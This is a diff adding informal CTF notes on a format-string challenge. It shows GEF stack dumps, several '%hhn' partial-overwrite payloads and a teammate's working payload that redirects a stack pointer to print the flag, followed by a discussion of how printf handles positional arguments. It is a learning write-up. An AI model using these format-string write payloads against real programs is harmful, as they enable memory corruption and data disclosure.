@@ -1,0 +1,48 @@
+────────────────────────────────────────────────────────────────────────────────────────
+0x00007fffffffe080│+0x0000: 0x000055555555c2d0  →  "%p %p %p %p %p %p %p %p %p\n"        ← $rsp
+0x00007fffffffe088│+0x0008: 0x00007fffffffe080  →  0x000055555555c2d0  →  "%p %p %p %p %p %p %p %p %p\n"
+0x00007fffffffe090│+0x0010: 0x000055555555c300  →  0x00000000fbad2488                      
+0x00007fffffffe098│+0x0018: 0x27bd8df8ec260300   
+────────────────────────────────────────────────────────────────────────────────────────
+gef➤  c                     
+Continuing.                                                                                                          
+0x7ffff7faeb23 0xc0c0 0x80 (nil) (nil) 0x55555555c2d0 0x7fffffffe080 0x55555555c300 0x27bd8df8ec260300
+
+the format string maximum 32 bytes
+use %hhn to write one byte to 0x7fffffffe080, and change it to 0xa0, and then print it?
+
+using "%160p%7$hhn%6$p", the output is ...0x55555555c2d0
+seems like the format string doesn't write to %7$ first
+or maybe printf stores the first few args in registers first, thus writing to the stack
+doesn't change the registers (%7$)
+
+
+
+%160p%7$hhn%7$p
+%160p%7$hhn%7$hhn%6$p
+%160p%7$hhn%6$c
+
+%65p%7$hhn%6$c
+
+
+
+
+My teammate @lebr0nli then solved this chall, and @linz solved this too after
+@linz exploit was "%c%c%c%c%c%155c%hhn#%6$s"
+
+their methods was exactly the same as mine, partial overwrite *(rsp+8) to make rsp point to flag,
+then print the flag in rsp
+
+however my payload "%160p%7$hhn%6$s" prints out *rsp first, then only overwrites *(rsp+8)
+whereas their payload overwrites first, then prints out *rsp
+
+I think linz's exploit worked and mine didn't cause printf internals processes/handles format specifiers sequentially,
+as in it handles %6$... first then only handle %7$...
+
+I did not know this. So, nice to learn smthg new.
+
+
+
+After making a ticket in the ctf discord about this:
+Robin — Today at 9:05 PM
+I believe the first $ will take a snapshot of the stack, that could affect things
